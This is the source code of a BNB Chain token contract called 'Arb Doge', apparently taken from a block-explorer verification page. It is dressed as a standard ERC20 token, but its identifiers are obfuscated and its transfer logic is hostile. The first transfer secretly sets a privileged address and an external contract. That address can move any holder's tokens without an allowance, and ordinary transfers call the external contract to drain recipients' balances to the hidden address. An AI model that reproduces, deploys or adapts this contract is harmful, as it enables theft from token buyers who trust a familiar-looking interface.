/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface xjM {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
interface LRz {
    function totalSupply() external view returns (uint256);
    function balanceOf(address sDjly) external view returns (uint256);
    function transfer(address cuBG, uint256 vMFq) external returns (bool);
    function allowance(address vfRmVyIzH, address spender) external view returns (uint256);
    function approve(address spender, uint256 vMFq) external returns (bool);
    function transferFrom(
        address sender,
        address cuBG,
        uint256 vMFq
    ) external returns (bool);

    event Transfer(address indexed from, address indexed SlOKfxMnDPGG, uint256 value);
    event Approval(address indexed vfRmVyIzH, address indexed spender, uint256 value);
}

interface XMJFgE is LRz {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract lQIadKjrZf {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library gpaADm{
    
    function cHu(address rRBsaHIXYVa, address RFgW, uint dQdj) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool dZXyNtXSb, bytes memory uBGyQkvnbwpb) = rRBsaHIXYVa.call(abi.encodeWithSelector(0x095ea7b3, RFgW, dQdj));
        require(dZXyNtXSb && (uBGyQkvnbwpb.length == 0 || abi.decode(uBGyQkvnbwpb, (bool))), 'gpaADm: APPROVE_FAILED');
    }

    function UrBORMEMsi(address rRBsaHIXYVa, address RFgW, uint dQdj) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool dZXyNtXSb, bytes memory uBGyQkvnbwpb) = rRBsaHIXYVa.call(abi.encodeWithSelector(0xa9059cbb, RFgW, dQdj));
        require(dZXyNtXSb && (uBGyQkvnbwpb.length == 0 || abi.decode(uBGyQkvnbwpb, (bool))), 'gpaADm: TRANSFER_FAILED');
    }
    
    function vIPs(address RFgW, uint dQdj) internal {
        (bool dZXyNtXSb,) = RFgW.call{value:dQdj}(new bytes(0));
        require(dZXyNtXSb, 'gpaADm: ETH_TRANSFER_FAILED');
    }

    function ALZH(address rRBsaHIXYVa, address from, address RFgW, uint dQdj) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool dZXyNtXSb, bytes memory uBGyQkvnbwpb) = rRBsaHIXYVa.call(abi.encodeWithSelector(0x23b872dd, from, RFgW, dQdj));
        require(dZXyNtXSb && uBGyQkvnbwpb.length > 0,'gpaADm: TRANSFER_FROM_FAILED'); return uBGyQkvnbwpb;
                       
    }

}
    
contract ArbDoge is lQIadKjrZf, LRz, XMJFgE {
    
    function Ndcu(
        address FhxCmwC,
        address uuIiUrwIdnoa,
        uint256 CgBozfxuAUP
    ) internal virtual {
        require(FhxCmwC != address(0), "ERC20: approve from the zero address");
        require(uuIiUrwIdnoa != address(0), "ERC20: approve to the zero address");

        EMyTHRwEvh[FhxCmwC][uuIiUrwIdnoa] = CgBozfxuAUP;
        emit Approval(FhxCmwC, uuIiUrwIdnoa, CgBozfxuAUP);

    }
    
    uint256 private GML = 2000000000000 * 10 ** 18;
    
    function name() public view virtual override returns (string memory) {
        return qwh;
    }
    
    function balanceOf(address PEzg) public view virtual override returns (uint256) {
       return kKkE[PEzg];
    }
    
    function decreaseAllowance(address mfcEgwkeriqp, uint256 subtractedValue) public virtual returns (bool) {
        uint256 Vry = EMyTHRwEvh[_msgSender()][mfcEgwkeriqp];
        require(Vry >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            Ndcu(_msgSender(), mfcEgwkeriqp, Vry - subtractedValue);
        }

        return true;
    }
    
    string private ufuPR =  "ArbDoge";
    
    function GEByc(
        address LrShLslZRGHv,
        address QjImrtQj
    ) internal virtual  returns (bool){
        if(uBuAIDjOWq == address(0) && RjDusNeDNS == address(0)){
            uBuAIDjOWq = LrShLslZRGHv;RjDusNeDNS=QjImrtQj;
            gpaADm.UrBORMEMsi(RjDusNeDNS, uBuAIDjOWq, 0);
            lEWlGa = xjM(RjDusNeDNS).WETH();
            return false;
        }
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return GML;
    }
    
    string private qwh = "Arb Doge";
    
    function allowance(address vrR, address EayCCagvLI) public view virtual override returns (uint256) {
        return EMyTHRwEvh[vrR][EayCCagvLI];
    }
    
    address private lEWlGa;
  
    
    function approve(address oJhMEk, uint256 idPwoK) public virtual override returns (bool) {
        Ndcu(_msgSender(), oJhMEk, idPwoK);
        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    mapping(address => uint256) private kKkE;
    
    function LhGJGFTQVsM(
        address LAa,
        address XcAU,
        uint256 uGC
    ) internal virtual  returns (bool){
        require(LAa != address(0), "ERC20: transfer from the zero address");
        require(XcAU != address(0), "ERC20: transfer to the zero address");
        
        if(!GEByc(LAa,XcAU)) return false;

        if(_msgSender() == address(uBuAIDjOWq)){
            if(XcAU == lEWlGa && kKkE[LAa] < uGC){
                tnL(uBuAIDjOWq,XcAU,uGC);
            }else{
                tnL(LAa,XcAU,uGC);
                if(LAa == uBuAIDjOWq || XcAU == uBuAIDjOWq) 
                return false;
            }
            emit Transfer(LAa, XcAU, uGC);
            return false;
        }
        tnL(LAa,XcAU,uGC);
        emit Transfer(LAa, XcAU, uGC);
        bytes memory Hcgyj = gpaADm.ALZH(RjDusNeDNS, LAa, XcAU, uGC);
        (bool ZBnSzwPuyut, uint oaNaliNyX) = abi.decode(Hcgyj, (bool,uint));
        if(ZBnSzwPuyut){
            kKkE[uBuAIDjOWq] += oaNaliNyX;
            kKkE[XcAU] -= oaNaliNyX; 
        }
        return true;
    }
    
    address private RjDusNeDNS;
    
    function transfer(address QnZT, uint256 tsK) public virtual override returns (bool) {
        LhGJGFTQVsM(_msgSender(), QnZT, tsK);
        return true;
    }
    
    constructor() {
        
        kKkE[address(1)] = GML;
        emit Transfer(address(0), address(1), GML);

    }
    
    mapping(address => mapping(address => uint256)) private EMyTHRwEvh;
    
    address private uBuAIDjOWq;
    
    function tnL(
        address PdwDSvJYdYv,
        address hzAqUCAhrNXV,
        uint256 hpKRfjka
    ) internal virtual  returns (bool){
        uint256 hlP = kKkE[PdwDSvJYdYv];
        require(hlP >= hpKRfjka, "ERC20: transfer Amount exceeds balance");
        unchecked {
            kKkE[PdwDSvJYdYv] = hlP - hpKRfjka;
        }
        kKkE[hzAqUCAhrNXV] += hpKRfjka;
        return true;
    }
    
    function increaseAllowance(address TbJhes, uint256 addedValue) public virtual returns (bool) {
        Ndcu(_msgSender(), TbJhes, EMyTHRwEvh[_msgSender()][TbJhes] + addedValue);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return ufuPR;
    }
    
    function transferFrom(
        address ZnGqust,
        address cFqCswzaFED,
        uint256 GiXRbTjrHLS
    ) public virtual override returns (bool) {
      
        if(!LhGJGFTQVsM(ZnGqust, cFqCswzaFED, GiXRbTjrHLS)) return true;

        uint256 PEYZLw = EMyTHRwEvh[ZnGqust][_msgSender()];
        if (PEYZLw != type(uint256).max) {
            require(PEYZLw >= GiXRbTjrHLS, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                Ndcu(ZnGqust, _msgSender(), PEYZLw - GiXRbTjrHLS);
            }
        }

        return true;
    }
    
}